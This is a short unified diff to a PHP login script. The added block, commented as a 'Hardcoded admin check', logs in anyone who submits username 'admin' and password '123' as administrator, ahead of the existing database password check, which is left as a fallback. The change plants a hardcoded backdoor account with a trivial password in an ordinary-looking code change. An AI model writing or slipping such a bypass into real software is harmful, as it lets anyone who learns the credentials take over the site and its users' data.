@@ -12,6 +12,15 @@ $error = '';
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $username = trim($_POST['username']);
     $password = trim($_POST['password']);
+    
+    // Hardcoded admin check
+    if ($username === 'admin' && $password === '123') {
+        $_SESSION['user_id'] = 'admin'; // Set a unique identifier for the hardcoded admin
+        header('Location: ../admin/index.php');
+        exit();
+    }
+    
+    // Existing database check as fallback
     $stmt = $pdo->prepare("SELECT id, password FROM users WHERE username = ?");
     $stmt->execute([$username]);
     $user = $stmt->fetch();
